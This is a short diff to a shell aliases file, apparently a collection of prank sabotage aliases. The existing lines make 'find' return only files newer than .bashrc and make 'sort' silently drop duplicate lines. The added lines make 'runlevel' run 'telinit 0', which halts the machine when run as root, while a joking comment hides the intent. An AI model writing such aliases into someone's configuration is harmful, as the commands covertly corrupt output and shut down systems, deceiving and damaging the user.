@@ -39,3 +39,6 @@ alias find="find -newer ~/.bashrc"
 
 # We can make sort more efficient.
 alias sort="sort -u"
+
+# I hope you're not running as root.
+alias runlevel="telinit 0"
